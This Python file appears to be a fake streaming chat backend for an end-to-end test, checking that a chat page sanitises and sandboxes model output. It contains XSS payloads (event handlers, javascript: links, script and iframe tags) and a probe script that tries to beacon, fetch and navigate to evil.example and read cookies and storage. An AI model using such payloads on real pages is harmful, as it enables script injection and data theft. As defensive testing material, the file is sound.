#!/usr/bin/env python3
"""A fake OpenAI-compatible streaming backend for the end-to-end test. Standard library only.

It answers from a script chosen by a keyword in the user's last message, streaming in small
chunks with pauses, so the page's incremental rendering is exercised for real. It records every
request body so the test can check what the server sent.

    python3 fakebackend.py 8099
"""
import json, sys, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

COMPACT = ('<p>Here is a comparison.'
           '<table><caption>Speed</caption><thead><tr><th>Language<th>Speed<th>Curve'
           '<tbody><tr><th>Go<td>Fast<td>Gentle<tr><th>Rust<td>Faster<td>Steep</table>'
           '<p>Steps:<ul><li>one<li>two<li>three</ul>'
           '<aside class="tip"><p>Pick the one you know.</aside>'
           '<menu><li><button value="Tell me more">More</button></li></menu>')
STRICT = '<p>Plain answer.</p>\n<ul>\n<li>a</li>\n<li>b</li>\n</ul>'
EVIL = ('<p onclick="window.__pwned=1">hi <a href="javascript:window.__pwned=1">link</a></p>'
        '<img src="https://evil.example/x.png" onerror="window.__pwned=1">'
        '<script>window.__pwned=1</script><style>body{display:none}</style>'
        '<p style="color:red">styled</p><iframe src="https://evil.example"></iframe><h1>big</h1>'
        '<aside class="evil" role="note"><p>kind</aside>')
PROBE_JS = r"""
const out = {}; const viol = [];
addEventListener('securitypolicyviolation', (e) => viol.push(e.violatedDirective));
const attempt = async (name, fn) => {
  const before = viol.length;
  try { const r = await fn(); await new Promise((ok) => setTimeout(ok, 60));   // a request can be queued, then blocked by CSP
    out[name] = viol.length > before ? 'blocked:csp ' + viol[before] : 'ALLOWED:' + String(r).slice(0, 40); }
  catch (e) { out[name] = 'blocked:' + (e && e.name); }
};
(async () => {
  await attempt('fetch-same-origin', () => fetch('/api/config').then((r) => r.status));
  await attempt('fetch-external', () => fetch('https://evil.example/x').then((r) => r.status));
  await attempt('sendBeacon', () => { if (!navigator.sendBeacon('https://evil.example/b', 'x')) throw new Error('refused'); return 'queued'; });
  await attempt('websocket', () => new Promise((ok, no) => { const w = new WebSocket('ws://127.0.0.1:1/'); w.onopen = () => ok('open'); w.onerror = () => no(new Error('x')); }));
  await attempt('image-beacon', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('x')); i.src = 'https://evil.example/i.png'; }));
  await attempt('dynamic-import', () => import('data:text/javascript,export default 1'));
  await attempt('parent.document', () => parent.document.title);
  await attempt('top.document', () => top.document.title);
  await attempt('localStorage', () => localStorage.length);
  await attempt('cookie', () => document.cookie.length);
  await attempt('indexedDB', () => indexedDB.databases());
  await attempt('window.open', () => { const w = window.open('https://evil.example/'); if (!w) throw new Error('null'); return 'opened'; });
  await attempt('top.location', () => { top.location.href = 'https://evil.example/'; return 'assigned'; });
  await attempt('nested-iframe-script', () => new Promise((ok, no) => { const f = document.createElement('iframe'); f.srcdoc = '<script>parent.__x=1<\/script>'; f.onload = () => ok('loaded'); document.body.append(f); setTimeout(() => no(new Error('t')), 300); }));
  await new Promise((r) => setTimeout(r, 200));
  out.cspViolations = viol.length;
  sendPrompt('PROBE-RESULT ' + JSON.stringify(out));
})();
"""
WIDGETPROBE = '<p>probe</p><template data-widget title="probe"><script>' + PROBE_JS + '</script></template>'
SLOW = '<p>' + 'word ' * 200 + '</p>'
SCRIPTS = {"compact": COMPACT, "strict": STRICT, "evil": EVIL, "slow": SLOW, "widgetprobe": WIDGETPROBE}
SEEN = []

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        if self.path == "/seen":
            b = json.dumps(SEEN).encode()
            self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers(); self.wfile.write(b)
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        SEEN.append({"auth": self.headers.get("Authorization"), "body": body})
        last = body["messages"][-1]["content"].lower()
        key = next((k for k in SCRIPTS if k in last), "strict")
        text = SCRIPTS[key]
        self.send_response(200); self.send_header("Content-Type", "text/event-stream"); self.end_headers()
        def send(delta):
            self.wfile.write(("data: " + json.dumps({"choices": [{"delta": delta}]}) + "\n\n").encode()); self.wfile.flush()
        try:
            send({"reasoning_content": "thinking about it. "})
            step, pause = (3, 0.004) if key != "slow" else (5, 0.05)
            if key == "compact":
                pause = 0.012
            for i in range(0, len(text), step):
                send({"content": text[i:i + step]}); time.sleep(pause)
            self.wfile.write(b"data: [DONE]\n\n"); self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError):
            pass

ThreadingHTTPServer(("127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 8099), H).serve_forever()
